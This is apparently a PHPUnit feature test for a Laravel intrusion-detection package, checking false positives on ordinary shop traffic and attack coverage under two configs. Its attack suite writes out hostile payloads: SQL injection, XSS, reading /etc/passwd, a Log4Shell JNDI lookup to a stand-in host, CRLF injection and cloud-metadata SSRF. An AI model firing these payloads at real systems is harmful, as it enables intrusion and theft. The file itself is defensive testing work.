<?php

namespace JayAnta\ThreatDetection\Tests\Feature;

use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Route;
use JayAnta\ThreatDetection\Services\ProbeDetectorService;
use JayAnta\ThreatDetection\Services\ThreatDetectionService;
use JayAnta\ThreatDetection\Tests\TestCase;
use PHPUnit\Framework\Attributes\Test;

/**
 * End-to-end process flow against a realistic Laravel application.
 *
 * Unit asserts prove a pattern matches a string. They cannot tell you what a
 * real app's traffic does to the log volume, which is the only question left
 * before this ships. This file drives a full storefront + admin + API route
 * table through the middleware with ordinary browser traffic, then through an
 * attack suite, and asserts on what actually landed in threat_logs.
 *
 * Two profiles are exercised:
 *
 *   default      — the shipped config, warts and all
 *   recommended  — the tuning this package should suggest to operators
 *
 * The recommended profile must satisfy both halves: silence on legitimate
 * traffic AND no loss of attack coverage. A tuning that quietens the log by
 * blinding the detector is worse than the noise.
 */
class Phase14ProductionFlowTest extends TestCase
{
    /** A normal Chrome user-agent — every legitimate request carries one. */
    private const BROWSER = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        . '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

    protected function setUp(): void
    {
        parent::setUp();

        $this->createThreatLogsTable();
        $this->createExclusionRulesTable();

        config([
            'threat-detection.enabled' => true,
            'threat-detection.detection_mode' => 'balanced',   // shipped default
            'threat-detection.min_confidence' => 0,
            'threat-detection.whitelisted_ips' => [],
            'threat-detection.notifications.enabled' => false,
            'threat-detection.queue.enabled' => false,
            'cache.default' => 'array',
        ]);

        $this->registerApplicationRoutes();
    }

    protected function tearDown(): void
    {
        ThreatDetectionService::flushCaches();
        ProbeDetectorService::flushCaches();
        Cache::flush();
        parent::tearDown();
    }

    /** The route table of a plausible mid-sized Laravel storefront. */
    private function registerApplicationRoutes(): void
    {
        $ok = fn() => response('OK', 200);

        Route::middleware('threat-detect')->group(function () use ($ok) {
            foreach ([
                '/', 'login', 'register', 'password/reset',
                'blog/my-first-post', 'products', 'products/running-shoes',
                'search', 'cart/add', 'checkout', 'profile',
                'admin', 'admin/dashboard', 'admin/users/42', 'admin/posts',
                'api/v1/orders', 'api/v1/users/42',
                // Recon targets — an attacker's requests hit these too.
                'wp-admin', '.env', 'deep/vendor/phpunit/phpunit/eval-stdin.php',
            ] as $uri) {
                Route::get('/' . ltrim($uri, '/'), $ok);
                Route::post('/' . ltrim($uri, '/'), $ok);
            }
        });
    }

    // ────────────────────────────────────────────
    //  The traffic
    // ────────────────────────────────────────────

    /** Ordinary human + first-party API traffic. None of this is an attack. */
    private function driveLegitimateTraffic(): void
    {
        $b = ['HTTP_USER_AGENT' => self::BROWSER];

        $this->get('/', $b);
        $this->get('/login', $b);
        $this->post('/login', ['email' => 'jane@example.com', 'password' => 'S3cretPassw0rd!'], $b);
        $this->post('/register', [
            'name' => 'Jane Doe', 'email' => 'jane@example.com',
            'password' => 'S3cretPassw0rd!', 'password_confirmation' => 'S3cretPassw0rd!',
        ], $b);
        $this->get('/blog/my-first-post', $b);
        $this->get('/products?category=shoes&sort=price_desc&page=2', $b);
        $this->get('/products/running-shoes', $b);

        // A search box a real user types into — legitimately contains SQL words.
        $this->get('/search?q=' . urlencode('how to use SELECT in mysql'), $b);

        $this->post('/cart/add', ['product_id' => '600123456789', 'qty' => '2'], $b);

        // Checkout: timestamps, invoice and SKU numbers. Not PII.
        $this->postJson('/checkout', [
            'order_id' => '1735689600000',
            'invoice_no' => '987654321',
            'items' => [['sku' => '600123456789', 'qty' => 2]],
            'total_paise' => '4999900',
        ]);

        // A profile form that legitimately collects Indian PII.
        $this->postJson('/profile', [
            'name' => 'Jane Doe',
            'mobile' => '9876543210',
            'pan' => 'ABCDE1234F',
            'bank_account' => '123456789012',
        ]);

        // Admin panel browsing.
        $this->get('/admin', $b);
        $this->get('/admin/dashboard', $b);
        $this->get('/admin/users/42', $b);

        // A CMS editor posting rich HTML — the classic false-positive source.
        $this->post('/admin/posts', [
            'title' => 'Our Q3 results',
            'body' => '<p>Revenue grew. <a href="https://example.com/report">Read more</a></p>',
        ], $b);

        // First-party API traffic.
        $this->getJson('/api/v1/orders?limit=50');
        $this->getJson('/api/v1/users/42');
        $this->postJson('/api/v1/orders', ['sku' => '600123456789', 'qty' => 1]);
    }

    /**
     * @return array<string,callable> label => request
     */
    private function attackSuite(): array
    {
        $scanner = ['HTTP_USER_AGENT' => 'sqlmap/1.7.2#stable (http://sqlmap.org)'];

        return [
            'sqli_union'        => fn() => $this->get('/search?q=' . urlencode("' UNION SELECT password FROM users--")),
            'xss_script'        => fn() => $this->post('/search', ['q' => '<script>alert(1)</script>']),
            'path_traversal'    => fn() => $this->get('/products?file=' . urlencode('../../etc/passwd')),
            'rce_shell'         => fn() => $this->post('/search', ['q' => "system('cat /etc/passwd')"]),
            'log4shell_header'  => fn() => $this->get('/', ['HTTP_X_API_VERSION' => '${jndi:ldap://evil.tld/a}']),
            'null_byte_raw'     => fn() => $this->get('/products?file=image.php%00.jpg'),
            'crlf_raw'          => fn() => $this->get('/products?next=a%0d%0aSet-Cookie:+x%3d1'),
            'sql_comment_evade' => fn() => $this->get('/search?q=UNION/**/SELECT'),
            'double_encoded'    => fn() => $this->get('/search?q=%2555%254e%2549%254f%254e'),
            'ssrf_metadata'     => fn() => $this->postJson('/api/v1/orders', ['callback' => 'http://169.254.169.254/latest/meta-data/']),
            'scanner_ua'        => fn() => $this->get('/', $scanner),
            'probe_wp_admin'    => fn() => $this->get('/wp-admin'),
            'probe_env'         => fn() => $this->get('/.env'),
            'nested_phpunit'    => fn() => $this->get('/deep/vendor/phpunit/phpunit/eval-stdin.php'),
        ];
    }

    /** Apply the tuning this package should recommend to operators. */
    private function applyRecommendedConfig(): void
    {
        config([
            // Suppress only LOW severity on API routes. The shipped default
            // suppresses low AND medium, which hides SSRF, directory traversal,
            // LFI and open redirect on precisely the routes where they are most
            // often exploited. Low-severity API chatter stays quiet.
            'threat-detection.api_route_filtering.suppress_levels' => ['low'],

            // Rich-content editors: only high-severity patterns.
            'threat-detection.content_paths' => ['admin/posts*'],

            // The profile form legitimately collects PII. Exempt those exact
            // paths rather than the field names globally, so the same value
            // appearing in a query string elsewhere is still a leak.
            'threat-detection.safe_paths' => [
                'mobile', 'pan', 'bank_account', 'aadhaar',
            ],

            // Drop the endpoint-probe patterns whose routes this app actually
            // serves. NOT skip_paths: that bypasses scanning entirely and would
            // leave the admin panel — the highest-value target in the app —
            // completely unmonitored.
            'threat-detection.custom_patterns' => $this->shippedCustomPatternsWithout([
                'Admin Path Access Attempt',
                'Test Endpoint Probe',
                'Debug Endpoint Probe',
                'Console Access Attempt',
                'Backup Directory Probe',
                'Internal Endpoint Probe',
                'Legacy System Access',
                'API User Enumeration',
                'Admin ID Enumeration',
            ]),
        ]);

        ThreatDetectionService::flushCaches();
    }

    private function shippedCustomPatternsWithout(array $dropLabels): array
    {
        $shipped = require __DIR__ . '/../../config/threat-detection.php';

        return array_filter(
            $shipped['custom_patterns'],
            fn($entry) => !in_array(is_array($entry) ? ($entry['label'] ?? '') : $entry, $dropLabels, true)
        );
    }

    private function loggedTypes(): array
    {
        return DB::table('threat_logs')->orderBy('id')->pluck('type')->all();
    }

    // ────────────────────────────────────────────
    //  Noise floor
    // ────────────────────────────────────────────

    /**
     * Documents the shipped-config noise floor explicitly rather than leaving
     * operators to discover it in production. If this list grows, that is a
     * deliberate decision someone has to make, not an accident.
     */
    #[Test]
    public function default_config_noise_floor_on_legitimate_traffic(): void
    {
        $this->driveLegitimateTraffic();

        $types = array_values(array_unique($this->loggedTypes()));
        sort($types);

        $this->assertEquals([
            '[custom] Admin Path Access Attempt',
            '[custom] Bank Account Number Detected',
            '[custom] Mobile Number Detected',
            '[custom] PAN Number Detected',
        ], $types, 'Shipped-config noise floor changed — confirm this is intended');
    }

    #[Test]
    public function recommended_config_is_silent_on_legitimate_traffic(): void
    {
        $this->applyRecommendedConfig();

        $this->driveLegitimateTraffic();

        $this->assertSame(
            [],
            $this->loggedTypes(),
            'Recommended config must produce zero entries for ordinary traffic'
        );
    }

    // ────────────────────────────────────────────
    //  Attack coverage
    // ────────────────────────────────────────────

    /** @return string[] labels of attacks that produced no log entry */
    private function runAttackSuite(): array
    {
        $missed = [];

        foreach ($this->attackSuite() as $label => $send) {
            DB::table('threat_logs')->delete();
            Cache::flush();

            $send();

            if (DB::table('threat_logs')->count() === 0) {
                $missed[] = $label;
            }
        }

        return $missed;
    }

    /**
     * Documents a blind spot in the shipped defaults rather than asserting it
     * away. api_route_filtering suppresses low AND medium severity on any path
     * containing '/api/', so an SSRF against the AWS metadata endpoint — a
     * medium-severity pattern, and an attack overwhelmingly delivered through
     * API callbacks — is detected and then discarded before it is written.
     *
     * The recommended profile narrows the suppression to 'low' and recovers it;
     * see recommended_config_detects_every_attack().
     */
    #[Test]
    public function default_config_suppresses_medium_severity_attacks_on_api_routes(): void
    {
        $this->assertSame(
            ['ssrf_metadata'],
            $this->runAttackSuite(),
            'Shipped-config attack blind spot changed — confirm this is intended'
        );
    }

    /**
     * The half that matters. Tuning for silence is trivial if you are allowed
     * to blind the detector; this proves the recommended profile costs nothing
     * in coverage — and in fact recovers an attack the defaults drop.
     */
    #[Test]
    public function recommended_config_detects_every_attack(): void
    {
        $this->applyRecommendedConfig();

        $missed = $this->runAttackSuite();

        $this->assertSame([], $missed, 'Recommended config blinded these attacks: ' . implode(', ', $missed));
    }

    /**
     * The admin panel is the highest-value target in the application. Dropping
     * the /admin *probe pattern* must not stop attacks aimed at admin routes
     * from being scanned — which is exactly what skip_paths would have done.
     */
    #[Test]
    public function admin_routes_are_still_scanned_under_the_recommended_config(): void
    {
        $this->applyRecommendedConfig();

        $this->get('/admin/dashboard?q=' . urlencode("' UNION SELECT password FROM users--"));

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[middleware] SQL Injection UNION',
        ]);
    }

    /** The passive-IDS contract holds across the whole flow. */
    #[Test]
    public function no_request_in_the_entire_flow_is_ever_blocked(): void
    {
        $this->driveLegitimateTraffic();

        foreach ($this->attackSuite() as $label => $send) {
            $send()->assertStatus(200);
        }
    }
}
